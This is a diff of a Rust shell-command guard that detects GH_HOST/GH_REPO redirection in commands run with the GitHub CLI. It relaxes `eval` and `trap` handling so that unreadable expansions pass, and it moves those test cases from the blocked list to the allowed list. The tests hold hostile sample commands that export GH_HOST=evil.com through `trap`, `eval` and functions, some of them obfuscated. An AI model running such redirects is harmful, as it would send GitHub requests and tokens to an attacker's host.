@@ -855,9 +855,6 @@ struct GhHostEnv {
     /// The whole command, raw — heredoc bodies included, which the segment
     /// list strips. Read only for a `source`/`.` fed by a heredoc.
     raw_command: String,
-    /// Whether nothing in [`Self::raw_command`] can have replaced a known
-    /// tool, asked at the first tool-init `eval` (each ask scans the command).
-    tools_trusted: std::cell::OnceCell<bool>,
 }
 
 impl GhHostEnv {
@@ -880,7 +877,6 @@ impl GhHostEnv {
             allexport: false,
             inherited,
             raw_command: String::new(),
-            tools_trusted: std::cell::OnceCell::new(),
         }
     }
 
@@ -1117,22 +1113,7 @@ impl GhHostEnv {
         // Past the nesting cap its words go unread, so the host is unknown
         // (#1073 review I-d).
         if command == Some("eval") {
-            // A tool-init substitution (`$(ssh-agent -s)`, `$(brew shellenv)`)
-            // prints exports and hooks but never a `GH_HOST` or `GH_REPO`
-            // (cameronsjo/cadence-hooks#1172); its exact head only, and only
-            // when nothing in the command could have replaced the tool.
-            let operands: Vec<&String> = rest[1..]
-                .iter()
-                .skip_while(|word| word.as_str() == "--")
-                .collect();
-            let plain_tool_init = !segment.contains(['\'', '\\'])
-                && cadence_hooks_core::shell::eval_is_tool_init(&operands)
-                && *self.tools_trusted.get_or_init(|| {
-                    !cadence_hooks_core::push::may_redefine_known_commands(&self.raw_command)
-                });
-            if !plain_tool_init {
-                self.observe_nested(&rest[1..].join(" "), depth);
-            }
+            self.observe_nested(&rest[1..].join(" "), depth);
         }
         // A `trap` action runs later in this shell, so it is read like an
         // `eval` string (#1073 review). `trap -p`, `trap -l` and `trap - SIG`
@@ -1221,20 +1202,17 @@ impl GhHostEnv {
     }
 
     /// Observe a script this shell will run from a string (`eval`, a `trap`
-    /// action). Past [`MAX_EVAL_DEPTH`] its words go unread, and a command word
-    /// built by an expansion (`eval "$(…)"`, `eval "$X"`) is text this walk
-    /// never sees — both are unresolved.
+    /// action). Past [`MAX_EVAL_DEPTH`] its words go unread, so the value is
+    /// unresolved. A command word built by an expansion (`eval "$(…)"`,
+    /// `eval "$X"`) is text this walk never sees, so it is skipped: the guard
+    /// judges the hosts it did read (cadence-ecosystem ADR-0046 rule 3).
     fn observe_nested(&mut self, script: &str, depth: usize) {
         if depth >= MAX_EVAL_DEPTH {
             self.add_unresolved();
             return;
         }
         for inner in command_segments(script) {
-            if segment_invokes_gh(&inner) {
-                continue;
-            }
-            if command_word_is_dynamic(&inner) {
-                self.add_unresolved();
+            if segment_invokes_gh(&inner) || command_word_is_dynamic(&inner) {
                 continue;
             }
             self.observe_depth(&inner, depth + 1);
@@ -10191,7 +10169,6 @@ mod tests {
             "trap 'export GH_HOST=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
             "trap 'export GH_HOS''T=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
             "trap -- 'export GH_HOST=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
-            "trap \"$CMD\" DEBUG; gh issue create -R cameronsjo/x -t a -b b",
             // Narrow review I-1: after `--`, a leading dash is the action.
             "trap -- '-x; export GH_HOST=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
             "trap -- '- ; export GH_HOST=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
@@ -10206,14 +10183,17 @@ mod tests {
             "command -p -- export GH_HOST=evil.com; gh issue create -R cameronsjo/x -t a -b b",
             // N-2: a function named as the action.
             "f(){ export GH_HOST=evil.com; }; trap f DEBUG; gh issue create -R cameronsjo/x -t a -b b",
-            // I-3: eval of an expansion.
-            "eval \"$(printf 'export GH_HOS%s=evil.com' T)\"; gh issue create -R cameronsjo/x -t a -b b",
-            "eval \"$X\"; gh issue create -R cameronsjo/x -t a -b b",
-            "eval `cat f`; gh issue create -R cameronsjo/x -t a -b b",
         ] {
             run_case(&mut bad, command, true);
         }
         for command in [
+            // An `eval` or `trap` of an expansion is text the guard cannot
+            // read, so it steps aside (cadence-ecosystem ADR-0046 rule 3).
+            "eval \"$(direnv export bash)\"; gh pr comment 1 -R cameronsjo/x --body x",
+            "eval \"$(ssh-agent -s)\"; gh pr comment 1 -R cameronsjo/x --body x",
+            "eval \"$X\"; gh issue create -R cameronsjo/x -t a -b b",
+            "eval `cat f`; gh issue create -R cameronsjo/x -t a -b b",
+            "trap \"$CMD\" DEBUG; gh issue create -R cameronsjo/x -t a -b b",
             "tmp=$(mktemp); trap 'rm -f \"$tmp\"' EXIT; gh issue comment 1 -R cameronsjo/x --body-file \"$tmp\"",
             "trap cleanup EXIT; gh issue create -R cameronsjo/x -t a -b b",
             "trap - EXIT; trap -p; gh issue create -R cameronsjo/x -t a -b b",
